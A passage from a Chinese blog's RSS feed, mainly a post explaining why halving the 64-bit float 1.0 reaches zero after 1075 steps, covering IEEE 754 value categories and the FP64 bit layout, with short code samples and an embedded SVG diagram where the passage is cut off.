>我们拒绝了主流赋予它们的意义，而这个愉快的下午是我们赋予它们的新的意义。</p><blockquote><p >本文列在<a href="/categories/life/">「生活」</a>分区，因此不是一篇严肃的对艺术的批判或讨论。</p></blockquote>]]></content:encoded>
      
      
      <category domain="https://i.hsfzxjy.site/categories/Life/">Life</category>
      
      
      
      <comments>https://i.hsfzxjy.site/2024-10-03-art-museum/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>一尺之槌，日取其半，1075日而竭</title>
      <link>https://i.hsfzxjy.site/repeatly-divide-one-until-zero/</link>
      <guid>https://i.hsfzxjy.site/repeatly-divide-one-until-zero/</guid>
      <pubDate>Thu, 10 Oct 2024 12:53:00 GMT</pubDate>
      
        
        
      <description>&lt;p &gt;今天的故事源自数月前我在 r/learnpython 上&lt;a href=&quot;https://www.reddit.com/r/learnpython/comments/19d29rm/comment/kj2zei5/?utm_source=share&amp;utm_medium=</description>
        
      
      
      
      <content:encoded><![CDATA[<p >今天的故事源自数月前我在 r/learnpython 上<a href="https://www.reddit.com/r/learnpython/comments/19d29rm/comment/kj2zei5/?utm_source=share&utm_medium=web3x&utm_name=web3xcss&utm_term=1&utm_content=share_button">回答的一个问题</a>。以下是对该问题的转述：</p><blockquote><p >将 64 位浮点数 1.0 不断除以 2，多少次后恰好变为 0？</p></blockquote><blockquote><div class="gk-unified-code tab" data-gk-style="tab"><div class="gk-code hljs" data-gk-id="python-sample" data-gk-title="Python"><div class="gk-code-display"><pre><span class="line">x, i = <span class="hljs-number">1.0</span>, <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span> x:</span><br><span class="line">    x /= <span class="hljs-number">2.0</span></span><br><span class="line">    i += <span class="hljs-number">1</span></span><br><span class="line"><span class="hljs-built_in">print</span>(i)  <span class="hljs-comment"># 1075</span></span><br></pre></div></div><div class="gk-code hljs" data-gk-id="rust-sample" data-gk-title="Rust"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">x</span> = <span class="hljs-number">1.0f64</span>;</span><br><span class="line">    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">i</span> = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> x != <span class="hljs-number">0</span>. {</span><br><span class="line">        x /= <span class="hljs-number">2.0</span>;</span><br><span class="line">        i += <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;{}&quot;</span>, i);  <span class="hljs-comment">// 1075</span></span><br><span class="line">}</span><br></pre></div></div><div class="gk-code hljs" data-gk-id="js-sample" data-gk-title="JS"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">let</span> x = <span class="hljs-number">1</span>,</span><br><span class="line">  i = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span> (x) {</span><br><span class="line">  x /= <span class="hljs-number">2</span></span><br><span class="line">  i++</span><br><span class="line">}</span><br><span class="line"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(i) <span class="hljs-comment">// 1075</span></span><br></pre></div></div></div></blockquote><p >古语云：“一尺之槌，日取其半，万世不竭”。但很显然，此话不适用于这个问题。浮点数的精度是有限的，当 <code>x / 2</code> 足够小时，浮点数终无法表示，便会得到结果 0。如以上代码所示，循环将终结在第 1075 次。</p><p >1075 次。这表明 64 位浮点能表示的最小数在 $2^{-1075}$ 这个量级，再小的数超出了表示范围，也就归于零了。但 1075 这个数很奇怪，它离 1024 很近，但又多出来一些，有零有整的，这是为什么呢？</p><p >这一切还要从浮点数的分类说起。</p><h2 id="浮点数的分类">浮点数的分类</h2><p >精通 Javascript 的读者会记得，JS 的数字体系中有一些奇怪的值，如 <code>±Infinity</code>、<code>NaN</code>、<code>±0</code>。这些值行为怪异，有着和“正常值”与众不同的运算法则。</p><p >这不是因为 JS 标新立异，恰恰相反，这是因为 JS 遵循了 IEEE 754 标准。JS 采用 IEEE 754 标准中的 64 位浮点数（以下简称 FP64）表示数字，而 <code>±Infinity</code>、<code>NaN</code> 等是标准中定义好的一系列特殊值，用来表示浮点运算中的诸多异常结果，如除以零、上下溢出等等。</p><p >这不免让人好奇：FP64 中一共有哪几类值呢？除了无穷大、零和 NaN 外，其他的都是正常值吗？</p><p >Rust 提供了一个非常有用的函数 <a href="https://doc.rust-lang.org/stable/core/primitive.f64.html#method.classify"><code>f64::classify()</code></a>，顾名思义即为浮点数作分类。该函数返回的结果是 <a href="https://doc.rust-lang.org/stable/core/num/enum.FpCategory.html"><code>core::num::FpCategory</code></a>，其定义如下：</p><div class="gk-code hljs" data-gk-id="BLOCK1"><div class="gk-code-display"><pre><span class="line"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">FpCategory</span> {</span><br><span class="line">    Nan,</span><br><span class="line">    Infinite,</span><br><span class="line">    Zero,</span><br><span class="line">    Subnormal,</span><br><span class="line">    Normal,</span><br><span class="line">}</span><br></pre></div></div><p >可以看到浮点数被分成五类，其中有三类 <code>Infinite</code>、<code>Zero</code> 和 <code>Nan</code> 为我们熟知，分别代表 无穷大、零和 NaN 三种情况。但刨去这些特殊值，还有两个类别 <code>Subnormal</code> 和 <code>Normal</code>。它们分别代表什么呢？</p><p >要了解二者的区别，我们要先知道 FP64 的二进制表示是如何构成的。</p><h2 id="fp64-的二进制表示">FP64 的二进制表示</h2><p >64 位浮点数，顾名思义，即采用 64 个比特位表示一个实数 x。这 64 位由三部分组成：符号 s、指数 e 和底数 m，分别占据 1、11 和 52 位长度。下图详细展示了 -0.9375 的二进制表示，用不同颜色标出了这三个部分：</p><figure class="d2"><svg xmlns="http://www.w3.org/2000/svg" width="526" height="292" preserveAspectRatio="xMinYMin meet" viewBox="0 0 751 417"><svg id="d2-svg" width="751" height="417" class="d2-1928264720" viewBox="0 0 751 417"><rect width="751" height="417" stroke-width="0" rx="0" style="fill:#fff"/><style>@font-face{font-family:d2-1928264720-font-regular;src:url(data:application/font-woff;base64,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)}.text-underline{text-decoration:underline}.d2-1928264720 .text-bold{font-family:'d2-1928264720-font-bold'}@font-face{font-family:d2-1928264720-font-bold;src:url(data:application/font-woff;base64,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)}.shape{shape-rendering:geometricPrecision;stroke-linejoin:round}.d2-1928264720 .fill-N1{fill:#0a0f25}.d2-1928264720 .stroke-B1{stroke:#0d32b2}</style><g id="bin"><g class="shape"><path fill="transparent" d="M0 0h751v334H0z" 